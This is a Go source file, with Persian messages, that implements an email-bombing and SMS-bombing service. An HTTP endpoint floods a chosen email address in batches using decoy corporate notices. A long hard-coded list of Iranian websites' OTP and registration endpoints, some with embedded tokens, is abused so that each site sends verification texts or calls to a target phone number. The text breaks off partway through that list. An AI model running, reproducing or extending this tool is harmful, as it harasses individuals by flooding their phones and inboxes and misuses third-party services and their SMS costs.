package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime"
	"net/http"
	"net/smtp"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var longMessages []string
var activeSessions sync.Map

var smtpConfig = struct {
	Host     string
	Port     int
	Username string
	Password string
}{}

type smsTarget struct {
	url  string
	data map[string]interface{}
}

type SessionStatus struct {
	PhoneNumber      string    `json:"phone_number"`
	TotalBatches     int       `json:"total_batches"`
	CompletedBatches int       `json:"completed_batches"`
	TotalAttempts    int       `json:"total_attempts"`
	TotalSuccess     int       `json:"total_success"`
	StartTime        time.Time `json:"start_time"`
	IsRunning        bool      `json:"is_running"`
}

func init() {
	longMessages = seedLongMessages()
	smtpConfig.Host = envOr("SMTP_HOST", "mail.mozahemyab.online")
	if p, err := parseEnvInt("SMTP_PORT", 587); err == nil {
		smtpConfig.Port = p
	} else {
		log.Printf("⚠️ هشدار: پورت SMTP نامعتبر یا تنظیم نشده. از پیش‌فرض %d استفاده می‌شود: %v", 587, err)
		smtpConfig.Port = 587
	}
	smtpConfig.Username = envOr("SMTP_USERNAME", "info@mozahemyab.online")
	smtpConfig.Password = envOr("SMTP_PASSWORD", "")
	if smtpConfig.Password == "" {
		log.Println("🔴 هشدار امنیتی جدی: رمز عبور SMTP از طریق متغیر محیطی SMTP_PASSWORD تنظیم نشده است.")
		log.Println("🔴 ایمیل‌ها ممکن است به دلیل عدم احراز هویت ارسال نشوند.")
	}
}

func envOr(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}

func parseEnvInt(k string, def int) (int, error) {
	if v := os.Getenv(k); v != "" {
		parsedV, err := strconv.Atoi(strings.TrimSpace(v))
		if err != nil {
			return def, fmt.Errorf("could not parse %s as int: %w", k, err)
		}
		return parsedV, nil
	}
	return def, nil
}

func withJSONHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		w.Header().Set("Cache-Control", "no-store")
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Headers", "Content-Type")
		w.Header().Set("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		next.ServeHTTP(w, r)
	})
}

func handleSendEmails(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, apiError{Error: "method not allowed"})
		return
	}

	var req sendEmailsReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, apiError{Error: "invalid JSON body"})
		return
	}

	if strings.TrimSpace(req.RecipientEmail) == "" {
		writeJSON(w, http.StatusBadRequest, apiError{Error: "لطفا آدرس ایمیل گیرنده را وارد کنید."})
		return
	}

	if req.NumEmailsToSend <= 0 && req.BatchSize <= 0 {
		writeJSON(w, http.StatusBadRequest, apiError{Error: "تعداد ایمیل‌ها مشخص نشده است."})
		return
	}

	if req.IntervalMinutes < 0 {
		writeJSON(w, http.StatusBadRequest, apiError{Error: "فاصله زمانی نمی‌تواند منفی باشد."})
		return
	}

	if req.TotalBatches < 0 {
		writeJSON(w, http.StatusBadRequest, apiError{Error: "تعداد مراحل نمی‌تواند منفی باشد."})
		return
	}

	if strings.TrimSpace(smtpConfig.Username) == "" || strings.TrimSpace(smtpConfig.Password) == "" || strings.TrimSpace(smtpConfig.Host) == "" || smtpConfig.Port == 0 {
		writeJSON(w, http.StatusInternalServerError, apiError{Error: "تنظیمات SMTP (نام کاربری، رمز عبور، هاست یا پورت) به درستی در کد یا متغیرهای محیطی تنظیم نشده است."})
		return
	}

	batchSize := req.BatchSize
	if batchSize <= 0 {
		batchSize = req.NumEmailsToSend
	}
	if batchSize <= 0 {
		writeJSON(w, http.StatusBadRequest, apiError{Error: "اندازه مرحله یا تعداد ایمیل معتبر نیست."})
		return
	}

	totalBatches := req.TotalBatches
	if totalBatches <= 0 {
		totalBatches = 1
	}

	interval := time.Duration(req.IntervalMinutes) * time.Minute
	totalEmails := batchSize * totalBatches

	go runEmailBombing(req.RecipientEmail, batchSize, totalBatches, interval, req.CustomMessage, req.CustomSubject)

	intervalInfo := "بدون وقفه"
	if req.IntervalMinutes > 0 {
		intervalInfo = fmt.Sprintf("هر %d دقیقه", req.IntervalMinutes)
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"status":  "success",
		"message": fmt.Sprintf("شروع ارسال %d ایمیل در %d مرحله (%s) از %s به %s...", totalEmails, totalBatches, intervalInfo, smtpConfig.Username, req.RecipientEmail),
		"details": map[string]interface{}{
			"recipient_email":  req.RecipientEmail,
			"total_emails":     totalEmails,
			"batch_size":       batchSize,
			"total_batches":    totalBatches,
			"interval_minutes": req.IntervalMinutes,
		},
	})
}

func runEmailBombing(recipientEmail string, batchSize int, totalBatches int, interval time.Duration, customMessage string, customSubject string) {
	sent := 0
	failed := 0
	nextMessageIndex := 0

	intervalDesc := "بدون وقفه"
	if interval > 0 {
		intervalDesc = interval.String()
	}
	log.Printf("📧 شروع ارسال ایمیل | گیرنده: %s | مراحل: %d | اندازه هر مرحله: %d | فاصله: %s", recipientEmail, totalBatches, batchSize, intervalDesc)

	for batch := 0; batch < totalBatches; batch++ {
		for i := 0; i < batchSize; i++ {
			var body, subject string
			if strings.TrimSpace(customMessage) != "" {
				body = customMessage
				subject = customSubject
				if strings.TrimSpace(subject) == "" {
					subject = "پیام دلخواه شما"
				}
			} else {
				msg := longMessages[nextMessageIndex%len(longMessages)]
				body = msg
				subject = deriveSubject(msg)
				nextMessageIndex++
			}
			if err := sendSMTPEmail(smtpConfig.Host, smtpConfig.Port, smtpConfig.Username, smtpConfig.Password, recipientEmail, subject, body); err != nil {
				failed++
			} else {
				sent++
			}
			time.Sleep(1 * time.Second)
		}

		if interval > 0 && batch+1 < totalBatches {
			time.Sleep(interval)
		}
	}
	log.Printf("📊 خلاصه ارسال ایمیل: موفق=%d، ناموفق=%d", sent, failed)
}

func deriveSubject(message string) string {
	firstLine := message
	if idx := strings.IndexRune(message, '\n'); idx >= 0 {
		firstLine = message[:idx]
	}
	firstLine = strings.TrimSpace(firstLine)
	firstLine = strings.TrimPrefix(firstLine, "موضوع: ")
	if firstLine == "" {
		return "بدون موضوع"
	}
	return firstLine
}

func sendSMTPEmail(host string, port int, username, password, to, subject, body string) error {
	addr := fmt.Sprintf("%s:%d", host, port)
	if password == "" {
		return fmt.Errorf("رمز عبور SMTP برای احراز هویت خالی است")
	}
	auth := smtp.PlainAuth("", username, password, host)
	from := username
	headers := map[string]string{
		"From":                      fmt.Sprintf("%s <%s>", mime.QEncoding.Encode("UTF-8", "فرستنده"), from),
		"To":                        to,
		"Subject":                   mime.QEncoding.Encode("UTF-8", subject),
		"MIME-Version":              "1.0",
		"Content-Type":              "text/plain; charset=UTF-8",
		"Content-Transfer-Encoding": "8bit",
	}

	var sb strings.Builder
	for k, v := range headers {
		sb.WriteString(k)
		sb.WriteString(": ")
		sb.WriteString(v)
		sb.WriteString("\r\n")
	}
	sb.WriteString("\r\n")
	sb.WriteString(body)

	// Log before sending to see what is attempted
	// log.Printf("💡 تلاش برای ارسال ایمیل به '%s' (از: '%s' هاست: '%s:%d' موضوع: '%s')", to, from, host, port, subject)

	err := smtp.SendMail(addr, auth, from, []string{to}, []byte(sb.String()))
	if err != nil {
		return fmt.Errorf("خطای SendMail: %w", err) // wrap the original error
	}
	return nil
}

func seedLongMessages() []string {
	return []string{
		`موضوع: اطلاعیه مهم: به‌روزرسانی سیستم مدیریت مالی
با سلام و احترام،
با توجه به تلاش‌های تیم توسعه، به اطلاع می‌رساند که از تاریخ 2025-10-12، سیستم مدیریت مالی شرکت با یک به‌روزرسانی جامع روبرو خواهد شد. این به‌روزرسانی شامل بهبودهای اساسی در رابط کاربری، افزایش سرعت پردازش و ارتقاء پروتکل‌های امنیتی است.
هدف از این تغییرات، فراهم کردن بستری امن‌تر و کارآمدتر برای مدیریت امور مالی شماست. جزئیات کامل و راهنمای استفاده از قابلیت‌های جدید به زودی در پورتال داخلی شرکت منتشر خواهد شد. از صبر و همکاری شما سپاسگزاریم.
با تشکر،
تیم پشتیبانی فنی`,
		`موضوع: دعوت به رویداد انحصاری: نوآوری‌های دیجیتال در سال ۲۰۲۵
با درود،
شما به شرکت در وبینار انحصاری ما در مورد نقش هوش مصنوعی در تحول کسب‌وکارهای مدرن دعوت شده‌اید. در این وبینار، کارشناسان برجسته در این حوزه به بررسی آخرین روندهای تکنولوژی و استراتژی‌های پیاده‌سازی موفق هوش مصنوعی می‌پردازند. برای ثبت‌نام و دریافت اطلاعات بیشتر، لطفاً به وب‌سایت ما مراجعه کنید.
با احترام فراوان،
واحد روابط عمومی و بازاریابی`,
		`موضوع: یادآوری: تکمیل فرم ارزیابی عملکرد سه‌ماهه
سلام،
پیرو اطلاعیه قبلی، خواهشمند است نسبت به تکمیل فرم ارزیابی عملکرد سه‌ماهه خود اقدام فرمایید. ارزیابی به موقع شما، به ما در برنامه‌ریزی بهتر برای رشد فردی و توسعه سازمان کمک شایانی می‌کند.
مهلت تکمیل فرم تا پایان روز 2025-10-12 است. در صورت نیاز به راهنمایی یا داشتن هرگونه سوال، لطفاً با مدیر مستقیم خود یا واحد منابع انسانی تماس بگیرید. از همکاری شما متشکریم.
با سپاس،
دپارتمان منابع انسانی`,
		`موضوع: پیشنهاد ویژه: پکیج‌های جدید آموزشی برای توسعه مهارت‌ها
با سلام،
با توجه به درخواست‌های متعدد شما، مجموعه جدیدی از پکیج‌های آموزشی تخصصی در زمینه‌های [نام چند حوزه مثل: هوش مصنوعی، برنامه‌نویسی پایتون، مدیریت پروژه] آماده شده است. این دوره‌ها توسط اساتید مجرب طراحی شده‌اند و به شما در ارتقاء مهارت‌های حرفه‌ای‌تان کمک خواهند کرد.
برای مشاهده لیست کامل دوره‌ها و استفاده از تخفیف ویژه برای همکاران، به وب‌سایت آموزشی ما مراجعه کنید. این فرصت را از دست ندهید!
با آرزوی موفقیت،
تیم آموزش و توسعه`,
		`موضوع: اطلاعیه: تغییر در سیاست‌های دورکاری از ماه آینده
همکاران محترم،
پیرو جلسات مدیریتی اخیر، به اطلاع می‌رساند که از ابتدای ماه [نام ماه آینده]، تغییراتی در سیاست‌های دورکاری اعمال خواهد شد. هدف از این تغییرات، افزایش همکاری تیمی و بهبود عملکرد کلی سازمان است.
جلسه‌ای توجیهی در تاریخ 2025-10-12 برگزار خواهد شد تا جزئیات کامل این تغییرات و نحوه اجرای آن‌ها برای شما توضیح داده شود. حضور در این جلسه برای همه همکاران الزامی است.
با تشکر از توجه شما،
مدیریت اجرایی`,
	}
}

func writeJSON(w http.ResponseWriter, status int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	enc := json.NewEncoder(w)
	enc.SetEscapeHTML(false)
	_ = enc.Encode(v)
}

type sendEmailsReq struct {
	RecipientEmail  string `json:"recipient_email"`
	NumEmailsToSend int    `json:"num_emails_to_send"`
	BatchSize       int    `json:"batch_size"`
	IntervalMinutes int    `json:"interval_minutes"`
	TotalBatches    int    `json:"total_batches"`
	CustomMessage   string `json:"custom_message"`
	CustomSubject   string `json:"custom_subject"`
}

type apiError struct {
	Error string `json:"error"`
}

type sendEmailsResp struct {
	Status  string `json:"status"`
	Message string `json:"message"`
}

type RequestData struct {
	PhoneNumber     string `json:"phone_number"`
	BatchSize       int    `json:"batch_size"`
	IntervalMinutes int    `json:"interval_minutes"`
	TotalBatches    int    `json:"total_batches"`
}

func runSmsBombing(phone string, targets []smsTarget, batchSize int, interval time.Duration, totalBatches int) {
	if len(targets) == 0 {
		// log.Printf("❌ هیچ سرویس پیامکی برای شماره %s تعریف نشده است.", phone)
		return
	}

	// Initialize session status
	status := &SessionStatus{
		PhoneNumber:      phone,
		TotalBatches:     totalBatches,
		CompletedBatches: 0,
		TotalAttempts:    0,
		TotalSuccess:     0,
		StartTime:        time.Now(),
		IsRunning:        true,
	}
	activeSessions.Store(phone, status)

	defer func() {
		status.IsRunning = false
		activeSessions.Store(phone, status)
		// log.Printf("✅ عملیات پیامک برای شماره %s به پایان رسید. مراحل: %d، تلاش‌ها: %d، موفق: %d",
		//  phone, status.CompletedBatches, status.TotalAttempts, status.TotalSuccess)
	}()

	if batchSize <= 0 {
		batchSize = len(targets)
	}
	if totalBatches <= 0 && interval <= 0 {
		totalBatches = 1
	}

	intervalDesc := "بدون وقفه"
	if interval > 0 {
		intervalDesc = fmt.Sprintf("%v", interval)
	}
	batchesDesc := "نامحدود"
	if totalBatches > 0 {
		batchesDesc = fmt.Sprintf("%d", totalBatches)
	}

	log.Printf("🚀 شروع عملیات برای %s | اندازه هر مرحله: %d | فاصله: %s | تعداد مراحل: %s",
		phone, batchSize, intervalDesc, batchesDesc)

	nextTargetIndex := 0

	sendBatch := func(batchNumber int) (attempts int, successes int) {
		log.Printf("📤 مرحله %d/%s شروع شد برای %s", batchNumber+1, batchesDesc, phone)
		ch := make(chan int, batchSize)
		for i := 0; i < batchSize; i++ {
			idx := (nextTargetIndex + i) % len(targets)
			target := targets[idx]
			go sms(target.url, target.data, ch)
		}
		nextTargetIndex = (nextTargetIndex + batchSize) % len(targets)
		for i := 0; i < batchSize; i++ {
			statusCode := <-ch
			attempts++
			if statusCode >= 200 && statusCode < 300 {
				successes++
				// fmt.Println("✅ پیام ارسال شد")
			} else {
				// fmt.Printf("❌ خطا در ارسال (کد: %d)\n", statusCode)
			}
		}
		// log.Printf("✔️ مرحله %d کامل شد | تلاش: %d | موفق: %d", batchNumber+1, attempts, successes)
		return attempts, successes
	}

	for batch := 0; ; batch++ {
		if batch > 0 && interval > 0 {
			// log.Printf("⏳ انتظار %v قبل از مرحله %d برای %s", interval, batch+1, phone)
			time.Sleep(interval)
		}
		attempts, successes := sendBatch(batch)
		status.CompletedBatches++
		status.TotalAttempts += attempts
		status.TotalSuccess += successes
		activeSessions.Store(phone, status)

		if totalBatches > 0 && batch+1 >= totalBatches {
			break
		}
		if interval <= 0 && totalBatches <= 0 && batch >= 0 {
			break
		}
	}
}

func seedTargets(phone string) []smsTarget {
	cleanPhone := strings.TrimPrefix(phone, "0")
	return []smsTarget{
		{"https://3tex.io/api/1/users/validation/mobile", map[string]interface{}{"receptorPhone": "0" + cleanPhone}},
		{"https://deniizshop.com/api/v1/sessions/login_request", map[string]interface{}{"mobile_phone": "0" + cleanPhone}},
		{"https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{"userKey": "0" + cleanPhone}},
		{"https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{"cellphone": "+98" + cleanPhone}},
		{"https://bck.behtarino.com/api/v1/users/phone_verification/", map[string]interface{}{"phone": "0" + cleanPhone}},
		{"https://abantether.com/users/register/phone/send/", map[string]interface{}{"phoneNumber": "0" + cleanPhone}},
		{"https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{"phone": "0" + cleanPhone}},
		{"https://api.torob.com/a/phone/send-pin/?phone_number=0" + cleanPhone, map[string]interface{}{}},
		{"https://core.gap.im/v1/user/add.json?mobile=%2B98" + cleanPhone, map[string]interface{}{}},
		{"https://3tex.io/api/1/users/validation/mobile", map[string]interface{}{"receptorPhone": phone}},
		{"https://deniizshop.com/api/v1/sessions/login_request", map[string]interface{}{"mobile_phone": phone}},
		{"https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{"userKey": phone}},
		{"https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{"cellphone": phone}},
		{"https://bck.behtarino.com/api/v1/users/phone_verification/", map[string]interface{}{"phone": phone}},
		{"https://abantether.com/users/register/phone/send/", map[string]interface{}{"phoneNumber": phone}},
		{"https://novinbook.com/index.php?route=account/phone", map[string]interface{}{"phone": phone, "call": "yes"}},
		{fmt.Sprintf("https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=%s", phone), map[string]interface{}{"esfelurm": "esfelurm"}},
		{"https://api.pooleno.ir/v1/auth/check-mobile", map[string]interface{}{"mobile": phone}},
		{"https://agent.wide-app.ir/auth/token", map[string]interface{}{"grant_type": "otp", "client_id": "62b30c4af53e3b0cf100a4a0", "phone": phone}},
		{"https://tap33.me/api/v2/user", map[string]interface{}{"credential": map[string]interface{}{"phoneNumber": phone, "role": "PASSENGER"}}},
		{"https://web.emtiyaz.app/json/login", map[string]interface{}{"send=1&cellphone=": phone}},
		{"https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{"phone": phone}},
		{"https://messengerg2c4.iranlms.ir/", map[string]interface{}{"api_version": "3", "method": "sendCode", "data": map[string]interface{}{"phone_number": phone, "send_type": "SMS"}}},
		{"https://nx.classino.com/otp/v1/api/login", map[string]interface{}{"mobile": phone}},
		{"https://bama.ir/signin-checkforcellnumber", map[string]interface{}{"cellNumber=": phone}},
		{"https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa", map[string]interface{}{"cellphone": phone}},
		{"https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{"phoneNumber": phone}},
		{"https://api.bitbarg.com/api/v1/authentication/registerOrLogin", map[string]interface{}{"phone": phone}},
		{"https://api.bahramshop.ir/api/user/validate/username", map[string]interface{}{"username": phone}},
		{"https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{"phone": phone}},
		{"https://takshopaccessorise.ir/api/v1/sessions/login_request", map[string]interface{}{"mobile_phone": phone}},
		{"https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{"phone=": phone}},
		{"https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", map[string]interface{}{"mobile": phone}},
		{"https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", map[string]interface{}{"mobile": phone}},
		{"https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{"phoneNumber": phone}},
		{"https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{"userName": phone}},
		{"https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{"mobile": phone}},
		{"https://bit24.cash/app/api/auth/check-mobile", map[string]interface{}{"mobile": phone}},
		{"https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{"mobile": phone}},
		{"https://api.raybit.net:3111/api/v1/authentication/register/mobile", map[string]interface{}{"mobile": phone}},
		{"https://www.pubisha.com/login/checkCustomerActivation", map[string]interface{}{"mobile=": phone}},
		{"https://farvi.shop/api/v1/sessions/login_request", map[string]interface{}{"mobile_phone": phone}},
		{"https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{"contact": phone}},
		{"https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{"UserName": phone}},
		{"https://www.sheypoor.com/auth", map[string]interface{}{"username": phone}},
		{"https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{"phone": phone}},
		{"https://a4baz.com/api/web/login", map[string]interface{}{"cellphone": phone}},
		{"https://api.anargift.com/api/people/auth", map[string]interface{}{"user": phone}},
		{"https://nobat.ir/api/public/patient/login/phone", map[string]interface{}{"mobile": phone}},
		{"https://www.buskool.com/send_verification_code", map[string]interface{}{"phone": phone}},
		{"https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{"Parameters": map[string]interface{}{"ApplicationType": "Web", "ApplicationUniqueToken": nil, "ApplicationVersion": "1.0.0", "MobileNumber": phone}}},
		{"https://www.simkhanapi.ir/api/users/registerV2", map[string]interface{}{"mobileNumber": phone}},
		{"https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{"username": phone}},
		{"https://shop.hyperjan.ir/api/users/manage", map[string]interface{}{"mobile": phone}},
		{"https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{"username": phone}},
		{"https://hiword.ir/wp-json/otp-login/v1/login", map[string]interface{}{"identifier": phone}},
		{"https://dicardo.com/main/sendsms", map[string]interface{}{"phone": phone}},
		{"https://ghasedak24.com/user/ajax_register", map[string]interface{}{"username": phone}},
		{"https://tikban.com/Account/LoginAndRegister", map[string]interface{}{"CellPhone": phone}},
		{"https://www.digistyle.com/users/login-register/", map[string]interface{}{"loginRegister[email_phone]": phone}},
		{"https://banankala.com/home/login", map[string]interface{}{"Mobile": phone}},
		{"https://www.iranketab.ir/account/register", map[string]interface{}{"UserName": phone}},
		{"https://ketabchi.com/api/v1/auth/requestVerificationCode", map[string]interface{}{"phoneNumber": phone}},
		{"https://www.offdecor.com/index.php?route=account/login/sendCode", map[string]interface{}{"phone": phone}},
		{"https://exo.ir/index.php?route=account/mobile_login", map[string]interface{}{"mobile_number": phone}},
		{"https://shahrfarsh.com/Account/Login", map[string]interface{}{"phoneNumber=": phone}},
		{"https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", map[string]interface{}{"phone_email": phone}},
		{"https://shop.beheshticarpet.com/my-account/", map[string]interface{}{"billing_mobile": phone}},
		{"https://www.khanoumi.com/accounts/sendotp", map[string]interface{}{"mobile": phone}},
		{"https://rojashop.com/api/auth/sendOtp", map[string]interface{}{"mobile": phone}},
		{"https://dadpardaz.com/advice/getLoginConfirmationCode", map[string]interface{}{"mobile": phone}},
		{"https://api.rokla.ir/api/request/otp", map[string]interface{}{"mobile": phone}},
		{"https://khodro45.com/api/v1/customers/otp/", map[string]interface{}{"mobile": phone}},
		{"https://mashinbank.com/api2/users/check", map[string]interface{}{"mobileNumber": phone}},
		{"https://api.pezeshket.com/core/v1/auth/requestCode", map[string]interface{}{"mobileNumber": phone}},
		{"https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{"method": "phone", "identifier": phone}},
		{"https://api.timcheh.com/auth/otp/send", map[string]interface{}{"mobile": phone}},
		{"https://client.api.paklean.com/user/resendCode", map[string]interface{}{"username": phone}},
		{"https://mobogift.com/signin", map[string]interface{}{"username": phone}},
		{"https://api.iranicard.ir/api/v1/register", map[string]interface{}{"mobile": phone}},
		{"https://tj8.ir/auth/register", map[string]interface{}{"mobile": phone}},
		{"https://cinematicket.org/api/v1/users/signup", map[string]interface{}{"phone_number": phone}},
		{"https://www.irantic.com/api/login/request", map[string]interface{}{"mobile": phone}},
		{"https://kafegheymat.com/shop/getLoginSms", map[string]interface{}{"phone": phone}},
		{"https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85", map[string]interface{}{"cellphone": phone}},
		{"https://www.delino.com/user/register", map[string]interface{}{"mobile": phone}},
		{"https://alopeyk.com/api/sms/send.php", map[string]interface{}{"phone": phone}},
		{"https://1401api.tamland.ir/api/user/signup", map[string]interface{}{"Mobile": phone}},
		{"https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", map[string]interface{}{"telephone": phone}},
		{"https://api.digikalajet.ir/user/login-register/", map[string]interface{}{"phone": phone}},
		{"https://melix.shop/site/api/v1/user/otp", map[string]interface{}{"mobile": phone}},
		{"https://safiran.shop/login", map[string]interface{}{"mobile": phone}},
		{"https://restaurant.delino.com/user/register", map[string]interface{}{"apiToken": "VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq", "clientSecret": "7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq", "device": "web", "username": phone}},
		{"https://garcon.tandori.ir/users/v1/main/login", map[string]interface{}{"phone": phone}},
		{"https://dastkhat-isad.ir/api/v1/user/store", map[string]interface{}{"mobile": phone}},
		{"https://irwco.ir/register", map[string]interface{}{"mobile": phone}},
		{"https://api.sibbank.ir/v1/auth/login", map[string]interface{}{"phone_number": phone}},
		{"https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{"phone_number": phone}},
		{"https://api.arshiyan.com/send_code", map[string]interface{}{"country_code": "98", "phone_number": phone}},
		{"https://backend.topnoor.ir/web/v1/user/otp", map[string]interface{}{"mobile": phone}},
		{"https://api.alinance.com/user/register/mobile/send/", map[string]interface{}{"phone_number": phone}},
		{"https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{"phone": phone}},
		{fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{"esfelurm": "esfelurm"}},
		{fmt.Sprintf("https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=%v&source=2&sendTokenIfNot=true", phone), map[string]interface{}{"esfelurm": "esfelurm"}},
		{"https://api.chartex.net/api/v2/user/validate", map[string]interface{}{"mobile": phone, "country_code": "IR", "provider_code": "RUBIKA"}},
		{"https://www.snapptrip.com/register", map[string]interface{}{"lang": "fa", "country_id": "860", "password": "snaptrippass", "mobile_phone": phone, "country_code": "+98", "email": "example@gmail.com"}},
		{fmt.Sprintf("https://api-v2.filmnet.ir/access-token/users/%v/otp", phone), map[string]interface{}{"esfelurm": "esfelurm"}},
		{"https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{"phone": phone, "captcha_token": ""}},
		{"https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", map[string]interface{}{"mobile": phone, "origin": "/", "referrer_id": ""}},
		{"https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{"mobile": phone, "country_code": "+98"}},
		{"https://api.raybit.net:3111/api/v1/authentication/register/mobile", map[string]interface{}{"mobile": phone, "side": "web"}},
		{fmt.Sprintf("https://api.torob.com/a/phone/send-pin/?phone_number=%s", phone), map[string]interface{}{"esfelurm": "esfelurm"}},
		{"https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{"UserName": phone}},
		{"https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{"contact": phone}},
		{fmt.Sprintf("https://core.gap.im/v1/user/add.json?mobile=%2B%s", phone), map[string]interface{}{"esfelurm": "esfelurm"}},
		{"https://app.mydigipay.com/digipay/api/users/send-sms", map[string]interface{}{"cellNumber": phone, "device": map[string]interface{}{"deviceId": "a16e6255-17c3-431b-b047-3f66d24c286f", "deviceModel": "WEB_BROWSER", "deviceAPI": "WEB_BROWSER", "osName": "WEB"}}},
		// {"https://gateway.wisgoon.com/api/v1/auth/login/", map[string]interface{}{"phone": phone, "recaptcha-response": "03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwS5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg", "token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"}}},
		{"https://tagmond.com/phone_number", map[string]interface{}{"utf8": "\u2713", "phone_number": phone, "g-recaptcha-response": ""}},
		{"https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{"mobile": phone, "country_id": 205}},
		{"https://api.anargift.com/api/people/auth", map[string]interface{}{"user": phone, "app_id": 99}},
		{fmt.Sprintf("https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B'phoneNumber':'azki_%v'%7D", phone), map[string]interface{}{"esfelurm": "esfelurm"}},
		{"https://lendo.ir/register?", map[string]interface{}{"_token": "mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6", "mobile": phone, "password": "ibvvb@3#9nc"}},
		{"https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox", map[string]interface{}{"contactInfo[mobile]": phone, "contactInfo[agreementAccepted]": "1", "contactInfo[teachingFieldId]": "1", "contactInfo[eduGradeIds][7]": "7", "submit_register": "1"}},
		{"https://www.pakhsh.shop/wp-admin/admin-ajax.php", map[string]interface{}{"action": "digits_check_mob", "countrycode": "+98", "mobileNo": phone, "csrf": "fdaa7fce6", "login": "2", "username": "", "email": "", "captcha": "", "captcha_ses": "", "json": "1", "whatsapp": "0"}},
		{"https://api.basalam.com/user", map[string]interface{}{"variables": map[string]interface{}{"mobile": phone, "query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"}}},
		{"https://crm.see5.net/api_ajax/sendotp.php", map[string]interface{}{"mobile": phone, "action": "sendsms"}},
		{"https://www.simkhanapi.ir/api/users/registerV2", map[string]interface{}{"mobileNumber": phone, "ReSendSMS": "False"}},
		{"https://my.limoome.com/api/auth/login/otp", map[string]interface{}{"mobileNumber": phone, "country": "1"}},
		{"https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient", map[string]interface{}{"_token": "bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R", "mobile": phone, "recaptcha": ""}},
		{"https://i.devslop.app/app/ifollow/api/otp.php/", map[string]interface{}{"number": phone, "state": "number"}},
